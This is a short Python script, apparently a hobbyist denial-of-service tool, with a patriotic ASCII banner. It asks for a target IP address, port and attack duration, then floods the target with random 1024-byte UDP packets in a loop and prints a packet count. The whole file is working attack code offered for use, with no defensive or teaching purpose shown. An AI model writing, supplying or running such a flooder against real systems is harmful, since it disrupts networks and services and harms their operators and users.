# you must have a strong router for this to work well
import os
import sys
import time
import socket
import random

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)

    os.system("cls")
    print("         \u001b[31m╔╦╗┌─┐┬┌─┌─┐  \u001b[34m╔═╗┌┬┐┌─┐┬─┐┬┌─┐┌─┐  \u001b[37m╔═╗┬─┐┌─┐┌─┐┌┬┐  \u001b[31m╔═╗┌─┐┌─┐┬┌┐┌")
    print("         \u001b[31m║║║├─┤├┴┐├┤   \u001b[34m╠═╣│││├┤ ├┬┘││  ├─┤  \u001b[37m║ ╦├┬┘├┤ ├─┤ │   \u001b[31m╠═╣│ ┬├─┤││││")
    print("         \u001b[31m╩ ╩┴ ┴┴ ┴└─┘  \u001b[34m╩ ╩┴ ┴└─┘┴└─┴└─┘┴ ┴  \u001b[37m╚═╝┴└─└─┘┴ ┴ ┴   \u001b[31m╩ ╩└─┘┴ ┴┴┘└┘")
    print("                     \u001b[34m|* * * * * * * \u001b[37mOOOOOOOOOOOOOOOOOOO|")
    print("                     \u001b[34m| * * * * * * *\u001b[31m:::::::::::::::::::|")
    print("                     \u001b[34m|* * * * * * * \u001b[37mOOOOOOOOOOOOOOOOOOO|")
    print("                     \u001b[34m| * * * * * * *\u001b[31m:::::::::::::::::::|")
    print("                     \u001b[34m|* * * * * * * \u001b[37mOOOOOOOOOOOOOOOOOOO|")
    print("                     \u001b[34m| * * * * * * *\u001b[31m:::::::::::::::::::|")
    print("                     \u001b[34m|* * * * * * * \u001b[37mOOOOOOOOOOOOOOOOOOO|")
    print("                     \u001b[34m|\u001b[31m:::::::::::::::::::::::::::::::::|")
    print("                     \u001b[34m|\u001b[37mOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO|")
    print("                     \u001b[34m|\u001b[31m:::::::::::::::::::::::::::::::::|")
    print("")
    ip = input("     \u001b[37m Enter target ip\u001b[32m : ")
    print("      \u001b[37mIP You Entered Is\u001b[31m ", ip)
    port = int(input("     \u001b[37m Enter Target Port\u001b[32m : "))
    dur = int(input("      \u001b[37mEnter Attack Time\u001b[32m : "))
    timeout = time.time() + dur
    sent = 0

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print("Sent",sent,"packets to",ip,"through",port,)
        except KeyboardInterrupt:
            main()
main()
